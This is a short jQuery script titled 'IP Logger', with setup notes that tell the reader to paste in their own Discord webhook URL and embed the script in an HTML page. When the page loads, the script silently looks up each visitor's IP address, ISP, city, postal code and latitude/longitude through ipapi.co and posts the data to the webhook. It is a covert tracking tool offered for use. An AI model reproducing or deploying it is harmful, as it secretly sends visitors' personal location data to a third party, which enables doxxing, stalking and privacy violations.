Usage: Replace the placeholder with your specific Discord Webhook URL. 
Setup a simple .html page and make sure to link to the right .js file or keep it on the page.
// IP Logger
$(document).ready(function() {
  // Get user information using IPAPI
  $.get("https://ipapi.co/json/", function(data) {
      // Send user information to Discord webhook
      var formattedData = "**IP: **" + data.ip + "
" +
                          "**Network: **" + data.network + "
" +
                          "**Version: **" + data.version + "
" +
                          "**ASN: **" + data.asn + "
" +
                          "**ISP: **" + data.org + "
" +
                          "**City: **" + data.city + "
" +
                          "**Postal Code: **" + data.postal + "
" +
                          "**Region: **" + data.region + "
" +
                          "**Country: **" + data.country_name + "
" +
                          "**Capital: **" + data.country_capital + "
" +
                          "**Country Population: **" + data.country_population + "
" +
                          "**Calling Code: **" + data.country_calling_code + "
" +
                          "**Latitude: **" + data.latitude + "
" +
                          "**Longitude: **" + data.longitude + "
" +
                          "**Timezone: **" + data.timezone + "
" +
                          "**Currency: **" + data.currency + "
";

      $.ajax({
          type: "POST",
          url: "https://discord.com/api/webhooks/your-webhook-url",
          data: JSON.stringify({ content: formattedData }),
          contentType: "application/json"
      });
  });
});
